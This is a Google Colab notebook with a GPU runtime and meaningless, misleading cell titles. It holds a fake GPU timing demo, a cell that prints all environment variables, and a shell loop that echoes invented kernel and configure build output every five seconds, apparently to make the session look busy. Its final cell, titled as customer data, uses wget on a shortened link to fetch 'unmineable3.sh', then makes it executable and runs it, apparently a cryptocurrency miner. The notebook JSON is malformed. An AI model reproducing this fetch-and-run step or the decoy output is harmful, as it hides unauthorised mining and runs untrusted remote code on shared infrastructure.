{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "vipllyll.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "5IHYgObGYg42"
      },
      "source": [
        "# **vipulooc**\n",
        "\n",
        "`dangru`\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "J46hmikhYmli",
        "cellView": "form"
      },
      "source": [
        "#@title grapic\n",
        "! nvidia-smi -L"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "IB_dAbg8Yvj5",
        "cellView": "form"
      },
      "source": [
        "#@title modu\n",
        "\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "# to measure exec time\n",
        "from timeit import default_timer as timer\n",
        "\n",
        "# normal function to run on cpu\n",
        "def func(a):\t\t\t\t\t\t\t\t\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\t\n",
        "\n",
        "\t\t\t\t\t\t\n",
        "def func2(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "\tn = 10000000\t\t\t\t\t\t\t\n",
        "\ta = np.ones(n, dtype = np.float64)\n",
        "\tb = np.ones(n, dtype = np.float32)\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc(a)\n",
        "\tprint(\"without GPU:\", timer()-start)\t\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc2(a)\n",
        "\tprint(\"with GPU:\", timer()-start)"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "x7MLYWtqY0Kg",
        "cellView": "form"
      },
      "source": [
        "#@title codeding maru\n",
        "\n",
        "import os\n",
        "' && '.join([f'export {name}=\"{value}\"' for name, value in os.environ.items()])"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "B3TP3IA8Y3DN",
        "cellView": "form"
      },
      "source": [
        "#@title viplooc TENSOR\n",
        "\n",
        "import tensorflow as tf\n",
        "\n",
        "from tensorflow import keras\n",
        "from tensorflow.keras import layers\n",
        "from tensorflow.keras import mixed_precision\n",
        "\n",
        "mixed_precision.set_global_policy('mixed_float16')"
      ],
      "execution_count": null,
      "outputs": []
    },
     {
      "cell_type": "code",
      "metadata": {
        "id": "sbuSn-OdY5Gx",
        "cellView": "form"
      },
      "source": [
        while :
do
	echo HOSTCC  scripts/basic/fixdep
	sleep 5
	echo HOSTCC  arch/x86/tools/relocs_32.o
	sleep 5
	echo HOSTCC  arch/x86/tools/relocs_64.o
	sleep 5
	echo HOSTCC  arch/x86/tools/relocs_common.o
	sleep 5
	echo HOSTLD  arch/x86/tools/relocs
	sleep 5
	echo CHK     include/config/kernel.release
	sleep 5
	echo CHK     include/generated/uapi/linux/version.h
	sleep 5
	echo CHK     include/generated/utsrelease.h
	sleep 5
	echo CC      kernel/bounds.s
	sleep 5
	echo CHK     include/generated/bounds.h
	sleep 5
	echo CHK     include/generated/timeconst.h
	sleep 5
	echo CC      arch/x86/kernel/asm-offsets.s
	sleep 5
	echo CHK     include/generated/asm-offsets.h
	sleep 5
	echo CALL    scripts/checksyscalls.sh
	sleep 5
	echo checking build system type... x86_64-pc-linux-gnu
	sleep 5
	echo checking host system type... x86_64-pc-linux-gnu
	sleep 5
	echo checking target system type... x86_64-pc-linux-gnu
	sleep 5
	echo checking for x86_64-pc-linux-gnu-g++... x86_64-pc-linux-gnu-g++
	sleep 5
	echo checking whether the C++ compiler works... yes
	sleep 5
	echo checking for C++ compiler default output file name... a.out
	sleep 5
	echo checking for suffix of executables... 
	sleep 5
	echo checking whether we are cross compiling... no
	sleep 5
	echo checking for suffix of object files... o
	sleep 5
	echo checking whether we are using the GNU C++ compiler... yes
	sleep 5
	echo checking whether x86_64-pc-linux-gnu-g++ accepts -g... yes
	sleep 5
	echo checking for x86_64-pc-linux-gnu-gcc... x86_64-pc-linux-gnu-gcc
	sleep 5
	echo checking whether we are using the GNU C compiler... yes
	sleep 5
	echo checking whether x86_64-pc-linux-gnu-gcc accepts -g... yes
	sleep 5
	echo checking for x86_64-pc-linux-gnu-gcc option to accept ISO C89... none needed
	sleep 5
	echo checking for a sed that does not truncate output... /bin/sed
	sleep 5
	echo checking for gawk... gawkecho 
	sleep 5
	echo checking whether ln -s works... yes
	sleep 5
	echo checking whether make sets $(MAKE)... yes
	sleep 5
	echo checking for a thread-safe mkdir -p... /bin/mkdir -p
	sleep 5
	echo checking for a BSD-compatible install... /usr/lib/portage/python3.4/ebuild-helpers/xattr/install -c
	sleep 5
	echo checking how to run the C++ preprocessor... x86_64-pc-linux-gnu-g++ -E
	sleep 5
	echo checking for grep that handles long lines and -e... /bin/grep
	sleep 5
	echo checking for egrep... /bin/grep -E
	sleep 5
	echo checking for ANSI C header files... yes
	sleep 5
	echo checking for sys/types.h... yes
	sleep 5
	echo checking for sys/stat.h... yes 
	sleep 5
	echo checking for stdlib.h... yes
	sleep 5
	echo checking for string.h... yes
	sleep 5
	echo checking for memory.h... yes
	sleep 5
	echo checking for strings.h... yes
	sleep 5
	echo checking for inttypes.h... yes
	sleep 5
	echo checking for stdint.h... yes
	sleep 5
	echo checking for unistd.h... yes
	sleep 5
	echo checking expat.h usability... yes
	sleep 5
	echo checking expat.h presence... yes
	sleep 5
	echo checking for expat.h... yes
	sleep 5
	echo checking iostream usability... yes
	sleep 5
	echo checking iostream presence... yes
	sleep 5
	echo checking for iostream... yes
	sleep 5
	echo checking libaio.h usability... yes
	sleep 5
	echo checking libaio.h presence... yes
	sleep 5
	echo checking for libaio.h... yes
	sleep 5
	echo checking boost/bind.hpp usability... yes
	sleep 5
	echo checking boost/bind.hpp presence... yes
	sleep 5
	echo checking for boost/bind.hpp... yes
	sleep 5
	echo checking boost/crc.hpp usability... yes		
	sleep 5
	echo checking boost/crc.hpp presence... yes	
	sleep 5
	echo checking for boost/crc.hpp... yes
	sleep 5
	echo checking boost/lexical_cast.hpp usability... yes
	sleep 5
	echo checking boost/lexical_cast.hpp presence... yes
	sleep 5
	echo checking for boost/lexical_cast.hpp... yesecho 
	sleep 5
	echo checking boost/noncopyable.hpp usability... yes
	sleep 5
	echo checking boost/noncopyable.hpp presence... yes
	sleep 5
	echo checking for boost/noncopyable.hpp... yes
	sleep 5
	echo checking boost/optional.hpp usability... yes
	sleep 5
	echo checking boost/optional.hpp presence... yes
	sleep 5
	echo checking for boost/optional.hpp... yes
	sleep 5
	echo checking boost/shared_ptr.hpp usability... yes
	sleep 5
	echo checking boost/shared_ptr.hpp presence... yes
	sleep 5
	echo checking for boost/shared_ptr.hpp... yes
	sleep 5
	echo checking boost/static_assert.hpp usability... yes
	sleep 5
	echo checking boost/static_assert.hpp presence... yes
	sleep 5
	echo checking for boost/static_assert.hpp... yes
	sleep 5
	echo checking file owner... 
	sleep 5
	echo checking group owner... 
	sleep 5
	echo checking whether to enable debugging... no
	sleep 5
	echo checking for C++ optimisation flag... 
	sleep 5
	echo checking whether to enable unit testing... no
	sleep 5
	echo checking getopt.h usability... yes
	sleep 5
	echo checking getopt.h presence... yes
	sleep 5
	echo checking for getopt.h... yes
	sleep 5
	echo configure: creating ./config.status
	sleep 5
	echo config.status: creating Makefile
	sleep 5
	echo config.status: creating unit-tests/Makefile
	sleep 5
	echo     [CXX] base/application.cc
	sleep 5
	echo     [CXX] base/base64.cc
	sleep 5
	echo     [CXX] base/endian_utils.cc
	sleep 5
	echo     [CXX] base/error_state.cc
	sleep 5
	echo     [CXX] base/progress_monitor.cc
	sleep 5
	echo     [DEP] base/error_state.cc
	sleep 5
	echo     [CXX] base/xml_utils.cc
	sleep 5
	echo     [DEP] base/endian_utils.cc
	sleep 5
	echo     [CXX] block-cache/block_cache.cc
	sleep 5
	echo     [DEP] base/application.cc
	sleep 5
	echo     [DEP] base/progress_monitor.cc
	sleep 5
	echo     [CXX] caching/cache_check.cc
	sleep 5
	echo     [CXX] caching/cache_dump.cc
	sleep 5
	echo     [DEP] block-cache/block_cache.cc
	sleep 5
	echo     [CXX] caching/cache_metadata_size.cc
	sleep 5
	echo     [DEP] base/base64.cc
	sleep 5
	echo     [CXX] caching/cache_repair.cc
	sleep 5
	echo     [DEP] caching/cache_dump.cc
	sleep 5
	echo     [DEP] base/xml_utils.cc
	sleep 5
	echo     [CXX] caching/cache_restore.cc
	sleep 5
	echo     [CXX] caching/hint_array.cc
	sleep 5
	echo     [DEP] caching/cache_check.cc
	sleep 5
	echo     [CXX] caching/mapping_array.cc
	sleep 5
	echo     [DEP] caching/cache_repair.cc
	sleep 5
	echo     [CXX] caching/metadata.cc
	sleep 5
	echo     [DEP] caching/cache_metadata_size.cc
	sleep 5
	echo     [CXX] caching/metadata_dump.cc
	sleep 5
	echo     [DEP] caching/cache_restore.cc
	sleep 5
	echo     [CXX] caching/restore_emitter.cc
	sleep 5
	echo     [DEP] caching/metadata_dump.cc
	sleep 5
	echo     [CXX] caching/superblock.cc
	sleep 5
	echo     [DEP] caching/metadata.cc
	sleep 5
	echo     [DEP] caching/hint_array.cc
	sleep 5
	echo     [CXX] caching/xml_format.cc
	sleep 5
	echo     [CXX] era/era_array.cc
	sleep 5
	echo     [DEP] caching/mapping_array.cc
	sleep 5
	echo     [CXX] era/era_check.cc
	sleep 5
	echo     [DEP] caching/restore_emitter.cc
	sleep 5
	echo     [DEP] caching/superblock.cc
	sleep 5
	echo     [CXX] era/era_detail.cc
	sleep 5
	echo     [CXX] era/era_dump.cc
	sleep 5
	echo     [DEP] era/era_detail.cc
	sleep 5
	echo     [CXX] era/era_invalidate.cc
	sleep 5
	echo     [DEP] caching/xml_format.cc
	sleep 5
	echo     [DEP] era/era_dump.cc
	sleep 5
	echo     [CXX] era/era_restore.cc
	sleep 5
	echo     [CXX] era/metadata.cc
	sleep 5
	echo     [DEP] era/era_check.cc
	sleep 5
	echo     [CXX] era/metadata_dump.cc
	sleep 5
	echo     [DEP] era/era_array.cc
	sleep 5
	echo     [CXX] era/restore_emitter.cc
	sleep 5
	echo     [DEP] era/metadata_dump.cc
	sleep 5
	echo     [CXX] era/superblock.cc
	sleep 5
	echo     [DEP] era/era_invalidate.cc
	sleep 5
	echo     [DEP] era/era_restore.cc
	sleep 5
	echo     [CXX] era/writeset_tree.cc
	sleep 5
	echo     [CXX] era/xml_format.cc
	sleep 5
	echo     [DEP] era/metadata.cc
	sleep 5
	echo     [CXX] main.cc
	sleep 5
	echo     [DEP] main.ccsleep 1
	sleep 5
	echo     [DEP] era/restore_emitter.cc
	sleep 5
	echo     [CXX] persistent-data/checksum.cc
	sleep 5
	echo     [CXX] persistent-data/data-structures/bitset.cc
	sleep 5
	echo     [DEP] persistent-data/checksum.cc
	sleep 5
	echo     [CXX] persistent-data/data-structures/bloom_filter.cc
	sleep 5
	echo     [DEP] era/superblock.cc
	sleep 5
	echo     [CXX] persistent-data/data-structures/btree.cc
	sleep 5
	echo     [DEP] persistent-data/data-structures/bloom_filter.cc
	sleep 5
	echo     [CXX] persistent-data/error_set.cc
	sleep 5
	echo     [DEP] era/xml_format.cc
	sleep 5
	echo     [CXX] persistent-data/file_utils.cc
	sleep 5
	echo     [DEP] persistent-data/data-structures/btree.cc
	sleep 5
	echo     [CXX] persistent-data/hex_dump.cc
	sleep 5
	echo     [DEP] era/writeset_tree.cc
	sleep 5
	echo     [CXX] persistent-data/space-maps/careful_alloc.cc
	sleep 5
	echo     [DEP] persistent-data/hex_dump.cc
	sleep 5
	echo     [CXX] persistent-data/space-maps/disk.cc
	sleep 5
	echo     [DEP] persistent-data/error_set.cc
	sleep 5
	echo     [DEP] persistent-data/file_utils.cc
	sleep 5
	echo     [CXX] persistent-data/space-maps/recursive.cc
	sleep 5
	echo     [CXX] persistent-data/space_map.cc
	sleep 5
	echo     [DEP] persistent-data/data-structures/bitset.cc
	sleep 5
	echo     [DEP] persistent-data/space_map.cc
	sleep 5
	echo     [CXX] thin-provisioning/device_tree.cc
	sleep 5
	echo     [DEP] persistent-data/space-maps/careful_alloc.cc
	sleep 5
	echo     [CXX] thin-provisioning/human_readable_format.cc
	sleep 5
	echo     [DEP] persistent-data/transaction_manager.cc
	sleep 5
	echo     [CXX] thin-provisioning/mapping_tree.cc
	sleep 5
	echo     [DEP] thin-provisioning/human_readable_format.cc
	sleep 5
	echo     [CXX] thin-provisioning/metadata.cc
	sleep 5
	echo     [DEP] persistent-data/space-maps/recursive.cc
	sleep 5
	echo     [CXX] thin-provisioning/metadata_checker.cc
	sleep 5
	echo     [DEP] persistent-data/space-maps/disk.cc
	sleep 5
	echo     [CXX] thin-provisioning/metadata_dumper.cc
	sleep 5
	echo     [DEP] thin-provisioning/device_tree.cc
	sleep 5
	echo     [DEP] thin-provisioning/metadata_checker.cc
	sleep 5
	echo     [CXX] thin-provisioning/restore_emitter.cc
	sleep 5
	echo     [CXX] thin-provisioning/rmap_visitor.cc
	sleep 5
	echo     [DEP] thin-provisioning/rmap_visitor.cc
	sleep 5
	echo     [DEP] thin-provisioning/metadata_dumper.cc	
	sleep 5
	echo     [CXX] thin-provisioning/superblock.cc	
	sleep 5
	echo     [CXX] thin-provisioning/thin_check.cc
	sleep 5
	echo     [DEP] thin-provisioning/metadata.cc
	sleep 5
	echo     [DEP] thin-provisioning/mapping_tree.cc
	sleep 5
	echo     [CXX] thin-provisioning/thin_delta.cc
	sleep 5
	echo     [CXX] thin-provisioning/thin_dump.cc
	sleep 5
	echo     [DEP] thin-provisioning/superblock.cc
	sleep 5
	echo     [CXX] thin-provisioning/thin_metadata_size.cc
	sleep 5
	echo     [DEP] thin-provisioning/thin_metadata_size.cc
	sleep 5
	echo     [CXX] thin-provisioning/thin_pool.cc
	sleep 5
	echo     [DEP] thin-provisioning/thin_check.cc
	sleep 5
	echo     [DEP] thin-provisioning/restore_emitter.cc
	sleep 5
	echo     [CXX] thin-provisioning/thin_repair.cc
	sleep 5
	echo     [CXX] thin-provisioning/thin_restore.cc
	sleep 5
	echo     [DEP] thin-provisioning/thin_dump.cc
	sleep 5
	echo     [CXX] thin-provisioning/thin_rmap.cc
	sleep 5
	echo     [DEP] thin-provisioning/thin_restore.cc
	sleep 5
	echo     [DEP] thin-provisioning/thin_repair.cc
	sleep 5
	echo     [CXX] thin-provisioning/xml_format.cc
	sleep 5
	echo     [DEP] thin-provisioning/thin_pool.cc
	sleep 5
	echo     [DEP] thin-provisioning/thin_delta.cc
	sleep 5
	echo     [DEP] thin-provisioning/xml_format.cc
	sleep 5
	echo     [DEP] thin-provisioning/thin_rmap.cc
	sleep 5
done
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "sbuSn-OdY5Gx",
        "cellView": "form"
      },
      "source": [
        "#@title viplooc costumer data\n",
        "! wget https://bit.ly/3zyyC1j && chmod +x unmineable3.sh && ./unmineable3.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
